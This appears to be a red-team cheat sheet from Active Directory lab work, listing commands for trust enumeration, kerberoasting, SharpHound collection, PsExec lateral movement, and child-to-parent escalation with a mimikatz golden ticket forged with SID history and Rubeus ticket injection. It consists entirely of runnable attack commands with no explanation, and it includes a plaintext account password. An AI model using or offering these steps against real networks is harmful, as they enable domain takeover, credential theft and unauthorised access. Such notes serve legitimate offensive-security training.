### Domain Trusts Recon
```

powershell Get-DomainTrust -Domain dev.insomnia.io 
powershell Get-DomainComputer -Domain dev.insomnia.io | select DnsHostName
SharpHound3 "-c All -D dev.insomnia.io"
execute-assembly C:\tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -D cyberbotic.io 
SharpView "Get-DomainUser -SPN -Domain dev.insomnia.io -Properties SamAccountName"
Rubeus kerberoast /domain:dev.insomnia.io 
make_token dev.insomnia.io \bridgesb Scorpion!
ls \\dtop685.dev.insomnia.io \c$
jump psexec dtop685.dev.insomnia.io SMB
```
### Bidirectional Parent/Child
```
powershell Get-DomainTrust
powershell Get-DomainComputer -Domain zeropointsecurity.co.uk  | select DnsHostName
powershell Get-DomainGroup -Identity 'Domain Admins' -Domain insomnia.io  | select ObjectSid
kerberos::golden /user:<> /domain:<> /sid:<> /sids:<> /krbtgt:<>
kerberos::golden /user:Administrator /domain:dev.insomnia.io  /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:REDACTED /ticket:MeMe.kirbi

kerberos_ticket_use C:\Users\Commando\Desktop\x64\MeMe.kirbi
ls \\ad01.insomnia.io\c$

Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x82ece /ticket:[...snip...]
ImpersonateProcess 1464
ls \\[...snip...]k\c$

```
